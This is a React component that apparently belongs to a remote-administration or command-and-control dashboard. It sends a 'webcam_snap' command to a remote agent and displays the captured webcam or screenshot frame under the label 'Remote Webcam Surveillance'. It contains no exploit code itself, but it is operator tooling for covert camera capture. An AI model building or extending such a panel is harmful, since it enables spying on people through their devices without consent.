import React, { useState, useEffect } from 'react';
import { Camera, RefreshCw, Video, AlertCircle } from 'lucide-react';
import { captureWebcam, sendCommand } from '../../services/api';
import { kaalEvents } from '../../services/eventBus';

const WebcamCapture = ({ agentId }) => {
    const [image, setImage] = useState(null);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(null);

    useEffect(() => {
        const unsubscribe = kaalEvents.on('task_result', (data) => {
            if (data.agent_id !== agentId) return;

            let parsed = null;
            try {
                if (typeof data.result === 'string' && (data.result.startsWith('{') || data.result.startsWith('['))) {
                    parsed = JSON.parse(data.result);
                } else if (typeof data.result === 'object') {
                    parsed = data.result;
                }
            } catch (e) { /* Not JSON */ }

            if (parsed && (parsed.type === 'webcam' || parsed.type === 'screenshot')) {
                let b64 = parsed.data || "";
                if (b64.startsWith("[SCREEN]")) b64 = b64.substring(8).trim();
                setImage(`data:image/jpeg;base64,${b64}`);
                setLoading(false);
            }
            else if (parsed && parsed.type === 'error') {
                setError(parsed.data || "Unknown Error");
                setLoading(false);
            }
            // Legacy [SCREEN]
            else if (data.result && typeof data.result === 'string' && data.result.startsWith("[SCREEN]")) {
                const b64 = data.result.substring(9).trim(); // [SCREEN] is 8 chars but usually space after? Old code used 9.
                // old code: substring(9) imply "[SCREEN] " 
                setImage(`data:image/jpeg;base64,${b64}`);
                setLoading(false);
            } else if (data.result && typeof data.result === 'string' && data.result.startsWith("Error")) {
                setError(data.result);
                setLoading(false);
            }
        });
        return () => unsubscribe();
    }, [agentId]);

    const handleCapture = async () => {
        setLoading(true);
        setError(null);
        try {
            // Send webcam_snap command
            await sendCommand(agentId, 'webcam_snap');
        } catch (err) {
            setError("Capture request failed: " + err.message);
            setLoading(false);
        }
    };

    return (
        <div className="h-full flex flex-col space-y-4">
            <div className="flex items-center justify-between p-4 bg-bg-secondary rounded-xl border border-border">
                <div>
                    <h3 className="text-sm font-semibold uppercase text-text-secondary tracking-wider flex items-center">
                        <Video className="w-4 h-4 mr-2 text-accent-secondary" />
                        Live Feed
                    </h3>
                    <p className="text-xs text-text-secondary mt-1">Remote Webcam Surveillance</p>
                </div>
                <div className="flex space-x-2">
                    <button
                        onClick={handleCapture}
                        disabled={loading}
                        className="px-4 py-2 bg-accent-primary text-bg-primary rounded-lg font-bold text-sm flex items-center shadow-[0_0_15px_rgba(0,255,159,0.3)] hover:shadow-[0_0_20px_rgba(0,255,159,0.5)] transition-all disabled:opacity-50"
                    >
                        {loading ? <RefreshCw className="w-4 h-4 mr-2 animate-spin" /> : <Camera className="w-4 h-4 mr-2" />}
                        {loading ? 'CAPTURING...' : 'CAPTURE FRAME'}
                    </button>
                </div>
            </div>

            <div className="flex-1 bg-black rounded-xl border border-border relative overflow-hidden flex items-center justify-center group">
                {image ? (
                    <img src={image} alt="Webcam Capture" className="w-full h-full object-contain" />
                ) : (
                    <div className="text-center p-10">
                        <div className="w-20 h-20 border-2 border-dashed border-text-secondary rounded-full flex items-center justify-center mx-auto mb-4 opacity-30 group-hover:opacity-50 transition-opacity">
                            <Camera className="w-10 h-10 text-text-secondary" />
                        </div>
                        <p className="text-text-secondary opacity-50">No video feed active</p>
                        <p className="text-xs text-text-secondary opacity-30 mt-2">Click Capture to request a frame</p>
                    </div>
                )}

                {/* Grid Overlay for "Cyber" feel */}
                <div className="absolute inset-0 pointer-events-none opacity-20 bg-[linear-gradient(rgba(0,255,159,0.1)_1px,transparent_1px),linear-gradient(90deg,rgba(0,255,159,0.1)_1px,transparent_1px)] bg-[size:40px_40px]"></div>

                {loading && (
                    <div className="absolute inset-0 bg-black/70 flex flex-col items-center justify-center z-10 backdrop-blur-sm">
                        <div className="w-16 h-16 border-4 border-accent-primary border-t-transparent rounded-full animate-spin mb-4"></div>
                        <p className="text-accent-primary font-mono text-sm animate-pulse">ESTABLISHING UPLINK...</p>
                    </div>
                )}

                {error && (
                    <div className="absolute bottom-4 left-4 right-4 bg-error/10 border border-error text-error p-3 rounded-lg flex items-center text-sm">
                        <AlertCircle className="w-4 h-4 mr-2 flex-shrink-0" />
                        {error}
                    </div>
                )}
            </div>

            <div className="bg-bg-secondary p-3 rounded-lg border border-border flex justify-between items-center text-xs text-text-secondary font-mono">
                <span>STATUS: {loading ? 'UPLINK ACTIVE' : 'STANDBY'}</span>
                <span>RESOLUTION: 1280x720</span>
                <span>FPS: 0</span>
            </div>
        </div>
    );
};

export default WebcamCapture;
